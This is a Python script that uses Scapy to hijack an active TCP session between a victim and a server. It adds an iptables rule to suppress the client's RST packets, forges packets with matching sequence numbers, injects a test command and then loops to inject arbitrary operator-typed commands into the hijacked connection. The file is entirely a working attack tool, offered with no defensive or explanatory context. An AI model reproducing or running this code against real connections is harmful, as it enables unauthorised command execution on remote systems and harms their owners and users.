from scapy.all import *
import sys
import os
 
filtre = "dst host " + sys.argv[1] + " and src host " + sys.argv[2] + " and src port " + sys.argv[3] + " and tcp[tcpflags] & tcp-push != 0"
 
os.system("clear") 
 
try:
 os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -s " + sys.argv[1] + " -j DROP") 
 print(" [+] iptables rule added for client RST packets\n")
except:
 print(" [-] iptables rule don't added for client RST packets\n")
 
def hijack_session(p):
  print(" ")  
  ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
  ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl,     proto=p[IP].proto, id=1337)
  tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", window=p[TCP].window, options=p[TCP].options)
  hijack = ether/ip/tcp/"echo 1337"
  sendp(hijack, verbose=0)

def perm_session(p):
  os.system("clear")
  if p[Raw].load:
   sys.stdout.write(p[Raw].load + " ")
  cmd = sys.stdin.read()
  ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
  ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl,     proto=p[IP].proto, id=1337)
  tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", window=p[TCP].window, options=p[TCP].options)
  packet = ether/ip/tcp/(cmd+"")
  sendp(packet, verbose=0)
  
 
print(" [*] Hunting TCP Session " + sys.argv[1] + " => " + sys.argv[2] + ":"+ sys.argv[3]+"")
try:
 sniff(count = 1, prn=hijack_session, filter=filtre, lfilter = lambda(f) : f.haslayer(TCP), store=0, iface=sys.argv[4])
except:
 print(" [-] Can't launch sniffer :'(")
 
while 1:
 try:
  sniff(count = 1, prn=perm_session, filter=filtre,  lfilter = lambda(f) : f.haslayer(TCP), store=0, iface=sys.argv[4])
 except:
  print(" [-] can't launch sniffer :'(")
